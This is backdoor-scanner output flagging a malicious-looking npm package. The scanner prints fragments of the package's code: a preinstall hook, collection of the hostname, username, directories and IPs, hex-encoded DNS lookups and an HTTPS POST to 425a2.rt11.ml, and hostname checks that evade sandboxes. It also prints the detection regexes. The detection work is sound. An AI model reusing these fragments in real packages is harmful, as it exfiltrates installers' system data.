[31m--[ [0m[34mMatch #[0m[33m1[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000103[0m
       Tag: [34mSecurity.Backdoor.Setup.Script[0m
  Severity: [36mModerate[0m, Confidence: [36mHigh[0m
  Filename: [33m/package.json[0m
   Pattern: [32m(pre|post|)install"\s*:\s*"node [^\s]+\.js[0m
[30;1m5 | [0m[35m  "main":"index.js",[0m
[30;1m6 | [0m[35m  "scripts":{[0m
[30;1m7 | [0m[35m  "test":"echo 'error no test specified' && exit 1",[0m
[30;1m8 | [0m[35m  "preinstall":"node index.js"[0m
[30;1m9 | [0m[35m  },[0m
[30;1m10 | [0m[35m  "author":"",[0m
[30;1m11 | [0m[35m  "License":"ISC"[0m

[31m--[ [0m[34mMatch #[0m[33m2[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000705[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.DNS[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32mdns.lookup[0m
[30;1m180 | [0m[35mvar qs = toName(td);[0m
[30;1m181 | [0m[35mif(isValid(td.hn,td.c,td.un,td.dirs)){[0m
[30;1m182 | [0m[35mfor(var j=0;j<qs.length;j++){[0m
[30;1m183 | [0m[35mdns.lookup(qs[j], function(err, result) {[0m
[30;1m184 | [0m[35m  //console.log(result)[0m
[30;1m185 | [0m[35m});[0m
[30;1m186 | [0m[35m}[0m

[31m--[ [0m[34mMatch #[0m[33m3[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000710[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.DNSSettings[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32mdns.getServers[0m
[30;1m173 | [0m[35m    hd: os.homedir(),[0m
[30;1m174 | [0m[35m    hn: os.hostname(),[0m
[30;1m175 | [0m[35m    un: os.userInfo().username,[0m
[30;1m176 | [0m[35m    dns: JSON.stringify(dns.getServers()),[0m
[30;1m177 | [0m[35m    ip: JSON.stringify(gethttpips()),[0m
[30;1m178 | [0m[35m    dirs: JSON.stringify(getFiles(["C:\\","D:\\","/","/home"])),[0m
[30;1m179 | [0m[35m}[0m

[31m--[ [0m[34mMatch #[0m[33m4[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m189 | [0m[35m    msg: trackingData,[0m
[30;1m190 | [0m[35m});[0m
[30;1m191 | [0m[35mvar options = {[0m
[30;1m192 | [0m[35m    hostname: "425a2.rt11.ml",[0m
[30;1m193 | [0m[35m    port: 443,[0m
[30;1m194 | [0m[35m    path: "/",[0m
[30;1m195 | [0m[35m    method: "POST",[0m

[31m--[ [0m[34mMatch #[0m[33m5[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m171 | [0m[35m    p: package,[0m
[30;1m172 | [0m[35m    c: __dirname,[0m
[30;1m173 | [0m[35m    hd: os.homedir(),[0m
[30;1m174 | [0m[35m    hn: os.hostname(),[0m
[30;1m175 | [0m[35m    un: os.userInfo().username,[0m
[30;1m176 | [0m[35m    dns: JSON.stringify(dns.getServers()),[0m
[30;1m177 | [0m[35m    ip: JSON.stringify(gethttpips()),[0m

[31m--[ [0m[34mMatch #[0m[33m6[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m162 | [0m[35mvar substr1 = "";[0m
[30;1m163 | [0m[35mvar substr2 = "";[0m
[30;1m164 | [0m[35mvar hostname = "425a2.rt11.ml";[0m
[30;1m165 | [0m[35mstr=toHex(pkg.hn)+"."+toHex(pkg.p)+"."+toHex(pkg.un)+"."+getPathChunks(pkg.c)+"."+getIps()+"."+hostn[0m
[30;1m166 | [0m[35mqueries.push(str);[0m
[30;1m167 | [0m[35mreturn queries;[0m
[30;1m168 | [0m[35m}[0m

[31m--[ [0m[34mMatch #[0m[33m7[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m161 | [0m[35mvar queries = [];[0m
[30;1m162 | [0m[35mvar substr1 = "";[0m
[30;1m163 | [0m[35mvar substr2 = "";[0m
[30;1m164 | [0m[35mvar hostname = "425a2.rt11.ml";[0m
[30;1m165 | [0m[35mstr=toHex(pkg.hn)+"."+toHex(pkg.p)+"."+toHex(pkg.un)+"."+getPathChunks(pkg.c)+"."+getIps()+"."+hostn[0m
[30;1m166 | [0m[35mqueries.push(str);[0m
[30;1m167 | [0m[35mreturn queries;[0m

[31m--[ [0m[34mMatch #[0m[33m8[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m70 | [0m[35mreturn false;[0m
[30;1m71 | [0m[35m}[0m
[30;1m72 | [0m[35m//else if(hostname == 'instance' && path.startsWith('/home/app/node_modules/') && username == 'app')[0m
[30;1m73 | [0m[35melse if(hostname == 'instance'){[0m
[30;1m74 | [0m[35mreturn false;[0m
[30;1m75 | [0m[35m}[0m
[30;1m76 | [0m[35melse{[0m

[31m--[ [0m[34mMatch #[0m[33m9[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m66 | [0m[35melse if(hostname == 'lili-pc'){[0m
[30;1m67 | [0m[35mreturn false;[0m
[30;1m68 | [0m[35m}[0m
[30;1m69 | [0m[35melse if(hostname == 'aws-7grara913oid5jsexgkq'){[0m
[30;1m70 | [0m[35mreturn false;[0m
[30;1m71 | [0m[35m}[0m
[30;1m72 | [0m[35m//else if(hostname == 'instance' && path.startsWith('/home/app/node_modules/') && username == 'app')[0m

[31m--[ [0m[34mMatch #[0m[33m10[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m63 | [0m[35mreturn false;[0m
[30;1m64 | [0m[35m}[0m
[30;1m65 | [0m[35m//else if(hostname == 'lili-pc' && checklili(path)){[0m
[30;1m66 | [0m[35melse if(hostname == 'lili-pc'){[0m
[30;1m67 | [0m[35mreturn false;[0m
[30;1m68 | [0m[35m}[0m
[30;1m69 | [0m[35melse if(hostname == 'aws-7grara913oid5jsexgkq'){[0m

[31m--[ [0m[34mMatch #[0m[33m11[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m59 | [0m[35melse if(checkhex(hostname) && path.startsWith('/root/node_modules') && lastdir == '/home/node'){[0m
[30;1m60 | [0m[35mreturn false;[0m
[30;1m61 | [0m[35m}[0m
[30;1m62 | [0m[35melse if(checkhex(hostname)){[0m
[30;1m63 | [0m[35mreturn false;[0m
[30;1m64 | [0m[35m}[0m
[30;1m65 | [0m[35m//else if(hostname == 'lili-pc' && checklili(path)){[0m

[31m--[ [0m[34mMatch #[0m[33m12[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m56 | [0m[35melse if(hostname == 'box'){[0m
[30;1m57 | [0m[35mreturn false;[0m
[30;1m58 | [0m[35m}[0m
[30;1m59 | [0m[35melse if(checkhex(hostname) && path.startsWith('/root/node_modules') && lastdir == '/home/node'){[0m
[30;1m60 | [0m[35mreturn false;[0m
[30;1m61 | [0m[35m}[0m
[30;1m62 | [0m[35melse if(checkhex(hostname)){[0m

[31m--[ [0m[34mMatch #[0m[33m13[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m53 | [0m[35melse if(hostname == 'box' && path.startsWith('/app/node_modules/')){[0m
[30;1m54 | [0m[35mreturn false;[0m
[30;1m55 | [0m[35m}[0m
[30;1m56 | [0m[35melse if(hostname == 'box'){[0m
[30;1m57 | [0m[35mreturn false;[0m
[30;1m58 | [0m[35m}[0m
[30;1m59 | [0m[35melse if(checkhex(hostname) && path.startsWith('/root/node_modules') && lastdir == '/home/node'){[0m

[31m--[ [0m[34mMatch #[0m[33m14[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m50 | [0m[35melse if(hostname == 'box' && path.startsWith('/app/node_modules/') && lastdir == '/home/node'){[0m
[30;1m51 | [0m[35mreturn false;[0m
[30;1m52 | [0m[35m}[0m
[30;1m53 | [0m[35melse if(hostname == 'box' && path.startsWith('/app/node_modules/')){[0m
[30;1m54 | [0m[35mreturn false;[0m
[30;1m55 | [0m[35m}[0m
[30;1m56 | [0m[35melse if(hostname == 'box'){[0m

[31m--[ [0m[34mMatch #[0m[33m15[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m47 | [0m[35melse if(checkhex(hostname) && checkpath(path)){[0m
[30;1m48 | [0m[35mreturn false;[0m
[30;1m49 | [0m[35m}[0m
[30;1m50 | [0m[35melse if(hostname == 'box' && path.startsWith('/app/node_modules/') && lastdir == '/home/node'){[0m
[30;1m51 | [0m[35mreturn false;[0m
[30;1m52 | [0m[35m}[0m
[30;1m53 | [0m[35melse if(hostname == 'box' && path.startsWith('/app/node_modules/')){[0m

[31m--[ [0m[34mMatch #[0m[33m16[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m44 | [0m[35melse if(checkhex(hostname) && path.startsWith('/root/node_modules/') && lastdir == '/home/node'){[0m
[30;1m45 | [0m[35mreturn false;[0m
[30;1m46 | [0m[35m}[0m
[30;1m47 | [0m[35melse if(checkhex(hostname) && checkpath(path)){[0m
[30;1m48 | [0m[35mreturn false;[0m
[30;1m49 | [0m[35m}[0m
[30;1m50 | [0m[35melse if(hostname == 'box' && path.startsWith('/app/node_modules/') && lastdir == '/home/node'){[0m

[31m--[ [0m[34mMatch #[0m[33m17[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m41 | [0m[35mif(hostname == "DESKTOP-4E1IS0K" && username == "daasadmin" && path.startsWith('D:\\TRANSFER\\')){[0m
[30;1m42 | [0m[35mreturn false;[0m
[30;1m43 | [0m[35m}[0m
[30;1m44 | [0m[35melse if(checkhex(hostname) && path.startsWith('/root/node_modules/') && lastdir == '/home/node'){[0m
[30;1m45 | [0m[35mreturn false;[0m
[30;1m46 | [0m[35m}[0m
[30;1m47 | [0m[35melse if(checkhex(hostname) && checkpath(path)){[0m

[31m--[ [0m[34mMatch #[0m[33m18[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m38 | [0m[35melse{[0m
[30;1m39 | [0m[35mlastdir = dirs[dirs.length-1];[0m
[30;1m40 | [0m[35m}[0m
[30;1m41 | [0m[35mif(hostname == "DESKTOP-4E1IS0K" && username == "daasadmin" && path.startsWith('D:\\TRANSFER\\')){[0m
[30;1m42 | [0m[35mreturn false;[0m
[30;1m43 | [0m[35m}[0m
[30;1m44 | [0m[35melse if(checkhex(hostname) && path.startsWith('/root/node_modules/') && lastdir == '/home/node'){[0m

[31m--[ [0m[34mMatch #[0m[33m19[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000704[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration.Hostname[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m.hostname[0m
[30;1m31 | [0m[35m    return false;[0m
[30;1m32 | [0m[35m}[0m
[30;1m33 | [0m[35m}[0m
[30;1m34 | [0m[35mfunction isValid(hostname,path,username,dirs){[0m
[30;1m35 | [0m[35mif(dirs.length==0){[0m
[30;1m36 | [0m[35mlastdir = "";[0m
[30;1m37 | [0m[35m}[0m

[31m--[ [0m[34mMatch #[0m[33m20[0m[34m of [0m[33m20[0m[31m ]--[0m
   Rule Id: [34mBD000700[0m
       Tag: [34mSecurity.Backdoor.DataExfiltration[0m
  Severity: [36mImportant[0m, Confidence: [36mLow[0m
  Filename: [33m/index.js[0m
   Pattern: [32m\.(request|post|get)\([0m
[30;1m199 | [0m[35m    },[0m
[30;1m200 | [0m[35m};[0m
[30;1m201 | [0m[35m[0m
[30;1m202 | [0m[35mvar req = https.request(options, (res) => {[0m
[30;1m203 | [0m[35m    res.on("data", (d) => {[0m
[30;1m204 | [0m[35m        //process.stdout.write(d);[0m
[30;1m205 | [0m[35m    });[0m

20 matches found.
